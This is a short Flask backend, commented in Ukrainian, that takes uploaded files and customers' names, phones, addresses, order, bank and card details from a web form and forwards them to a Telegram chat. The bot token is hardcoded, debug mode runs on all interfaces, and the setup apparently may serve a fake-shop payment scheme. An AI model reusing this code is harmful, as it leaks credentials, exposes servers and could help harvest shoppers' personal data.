from flask import Flask, request, jsonify
from flask_cors import CORS
import requests
import os

app = Flask(__name__, static_folder='.', static_url_path='')
CORS(app)

# ВАШІ СЕКРЕТНІ ДАНІ (Тепер вони безпечно заховані на бекенді!)
TOKEN = "8530214585:AAGOGeqW_UCDisqcocs5J5aG-pchDaV2uCo"
CHAT_ID = "8757768103"

@app.route('/')
def index():
    # Віддаємо нашу HTML сторінку при вході на сайт
    return app.send_static_file('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    try:
        # 1. Отримуємо файл
        file = request.files.get('file')
        if not file:
            return jsonify({'ok': False, 'error': 'Файл не знайдено'}), 400

        # 2. Отримуємо всі текстові дані з форми (включаючи нові поля!)
        name = request.form.get('name', 'Не вказано')
        phone = request.form.get('phone', 'Не вказано')
        address = request.form.get('address', 'Не вказано')
        delivery_time = request.form.get('delivery_time', 'Не вказано')
        order = request.form.get('order', 'Невідомо')
        price = request.form.get('price', '0')
        bank = request.form.get('bank', 'Невідомо')
        card = request.form.get('card', 'Невідомо')
        receiver = request.form.get('receiver', 'Невідомо')

        # 3. Формуємо красивий текст для Telegram
        caption = (
            f"💳 <b>Нова оплата!</b>\n\n"
            f"📦 Замовлення: {order}\n"
            f"💰 Сума: {price} ₽\n"
            f"🏦 Банк: {bank}\n"
            f"💳 Картка: {card}\n"
            f"👤 Отримувач: {receiver}\n"
            f"➖➖➖➖➖➖➖➖\n"
            f"🧑 Клієнт: {name}\n"
            f"📞 Телефон: {phone}\n"
            f"📍 Адреса: {address}\n"
            f"⏰ Час/Дата доставки: {delivery_time}"
        )

        # 4. Відправляємо в Telegram
        tg_url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
        
        # Передаємо файл у правильному форматі для requests
        files = {'document': (file.filename, file.stream, file.mimetype)}
        data = {
            'chat_id': CHAT_ID,
            'caption': caption,
            'parse_mode': 'HTML' # Щоб працювали жирні шрифти
        }

        tg_response = requests.post(tg_url, data=data, files=files)
        tg_data = tg_response.json()

        # 5. Перевіряємо відповідь від Telegram
        if tg_response.ok and tg_data.get('ok'):
            return jsonify({'ok': True})
        else:
            error_msg = tg_data.get('description', 'Помилка Telegram API')
            print(f"Помилка від ТГ: {error_msg}")
            return jsonify({'ok': False, 'error': error_msg}), 400

    except Exception as e:
        print(f"Помилка сервера: {e}")
        return jsonify({'ok': False, 'error': 'Внутрішня помилка сервера'}), 500

if __name__ == '__main__':
    # Запускаємо локальний сервер (додав host='0.0.0.0' для кращої роботи на DigitalOcean)
    app.run(debug=True, port=5000, host='0.0.0.0')